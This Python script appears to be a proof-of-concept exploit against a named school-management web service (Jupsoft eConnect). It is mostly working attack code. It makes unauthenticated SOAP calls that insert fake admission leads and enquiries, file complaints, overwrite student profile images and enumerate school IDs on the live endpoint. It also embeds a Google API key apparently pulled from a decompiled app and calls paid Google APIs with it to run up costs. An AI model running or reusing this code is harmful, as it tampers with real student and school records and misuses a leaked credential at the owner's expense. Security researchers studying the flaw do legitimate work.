#!/usr/bin/env python3
"""
PoC: Jupsoft eConnect Unauthenticated SOAP Write Operations
Target: https://econnectk12wcf.jupsoft.com/eConnectK12services.asmx
Discovered via APK decompilation (Admin v65.0.0 & Student v66.0.0)
"""
import requests
import sys
import json

TARGET = "https://econnectk12wcf.jupsoft.com/eConnectK12services.asmx"
NS = "https://econnectapp.jupsoft.com/"

def soap_call(method, params, headers_extra=None):
    """Execute a SOAP 1.1 call and return parsed response"""
    parts = []
    for k, v in params.items():
        parts.append(f"      <{k}>{v}</{k}>")
    body_xml = "\n".join(parts)
    
    xml = f"""<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:xsd="http://www.w3.org/2001/XMLSchema"
  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <{method} xmlns="{NS}">
{body_xml}
    </{method}>
  </soap:Body>
</soap:Envelope>"""
    
    headers = {
        "Content-Type": "text/xml; charset=utf-8",
        "SOAPAction": f"{NS}{method}"
    }
    if headers_extra:
        headers.update(headers_extra)
    
    r = requests.post(TARGET, data=xml, headers=headers, verify=False, timeout=15)
    
    # Extract result
    import re
    result_match = re.search(rf'<{method}Result[^>]*>(.*?)</{method}Result>', r.text, re.DOTALL)
    result = result_match.group(1).strip() if result_match else r.text[:200]
    return r.status_code, result

def test_insert_admission_lead(school_id=236, session_id=18):
    """Insert fake admission lead - NO AUTH REQUIRED"""
    print(f"\n[+] InsertAdmissionLead (SchoolId={school_id})")
    status, result = soap_call("InsertAdmissionLead", {
        "StudentName": "PoC-Test-Student",
        "ParentName": "PoC-Test-Parent",
        "Classid": "1",
        "Email": "poc@securitytest.com",
        "MobileNo": "9999999999",
        "Address": "Test Address from Security Assessment",
        "SchoolId": str(school_id),
        "SessionId": str(session_id),
        "Gender": "1",
        "Remark": "Security assessment proof of concept"
    })
    print(f"  HTTP {status} | Result: {result}")
    return "successfully" in result.lower()

def test_insert_enquiry_detail(school_id=236, session_id=18):
    """Insert fake enquiry - NO AUTH REQUIRED"""
    print(f"\n[+] InsertEnquiryDetail (SchoolId={school_id})")
    status, result = soap_call("InsertEnquiryDetail", {
        "SchoolId": str(school_id),
        "SessionId": str(session_id),
        "StudentName": "PoC-Enquiry",
        "ParentName": "PoC-Enquiry-Parent",
        "Email": "enquiry@poc.com",
        "MobileNo": "9999999998"
    })
    print(f"  HTTP {status} | Result: {result}")
    return "successfully" in result.lower()

def test_insert_student_complaint(username="test", school_code="HILWOD", session_id=18):
    """File a complaint against a user - NO AUTH REQUIRED"""
    print(f"\n[+] InsertStudentConplaint (User={username}, School={school_code})")
    status, result = soap_call("InsertStudentConplaint", {
        "Username": username,
        "SchoolCode": school_code,
        "SessionId": str(session_id),
        "NatureofGrievance": "Test grievance from security assessment",
        "GrievanceAgainst": "System",
        "Description": "PoC complaint description"
    })
    print(f"  HTTP {status} | Result: {result}")
    return result

def test_update_student_profile_image(username, school_code, image_b64="iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="):
    """Try to update student profile image - NO AUTH REQUIRED"""
    print(f"\n[+] UpdateStudentProfileImage (User={username}, School={school_code})")
    status, result = soap_call("UpdateStudentProfileImage", {
        "UserName": username,
        "SchoolCode": school_code,
        "Image": image_b64
    })
    print(f"  HTTP {status} | Result: {result}")
    return result

def enumerate_schools():
    """Enumerate valid school IDs by testing InsertAdmissionLead"""
    valid_schools = []
    for sid in [64, 65, 236]:
        _, result = soap_call("InsertAdmissionLead", {
            "StudentName": "Enum",
            "ParentName": "Enum",
            "Classid": "1",
            "Email": f"enum{sid}@test.com",
            "MobileNo": "9999999999",
            "SchoolId": str(sid),
            "SessionId": "18",
            "Gender": "1"
        })
        if "successfully" in result.lower():
            valid_schools.append(sid)
            print(f"  SchoolId {sid}: VALID - {result}")
    return valid_schools

def google_api_cost_abuse(api_key="AIzaSyAEYiWz7sWWn87QPjZNuhvd2Ahzlk50-hU"):
    """Demonstrate Google API key abuse for cost exposure"""
    print("\n[+] Google API Cost Abuse Demonstration")
    # Geocoding reverse lookup (costs per request)
    geo = requests.get(
        f"https://maps.googleapis.com/maps/api/geocode/json?latlng=40.7142,-74.0064&key={api_key}",
        timeout=10
    )
    print(f"  Geocoding API: {geo.json().get('status')}")
    
    # Distance Matrix (costs per element)  
    dist = requests.get(
        f"https://maps.googleapis.com/maps/api/distancematrix/json?origins=NYC&destinations=LA&key={api_key}",
        timeout=10
    )
    print(f"  Distance Matrix: {dist.json().get('status')}")
    
    # Cloud Natural Language (costs per request)
    nlp = requests.post(
        f"https://language.googleapis.com/v1/documents:analyzeSentiment?key={api_key}",
        json={"document": {"type": "PLAIN_TEXT", "content": "Test abuse"}, "encodingType": "UTF8"},
        timeout=10
    )
    print(f"  Natural Language: {nlp.json().get('error', {}).get('status', 'OK')}")

if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()
    
    print("=" * 60)
    print("Jupsoft eConnect - Unauthenticated SOAP Write Operations PoC")
    print("=" * 60)
    
    # Test 1: Known schools
    print("\n[*] Testing School IDs...")
    enumerate_schools()
    
    # Test 2: Write operations
    test_insert_admission_lead(236, 18)
    test_insert_enquiry_detail(236, 18)
    test_insert_student_complaint("admin", "HILWOD", 18)
    test_update_student_profile_image("nonexistent", "HILWOD")
    
    # Test 3: Google API abuse
    google_api_cost_abuse()
    
    print("\n" + "=" * 60)
    print("PoC Complete - All operations tested")
    print("=" * 60)
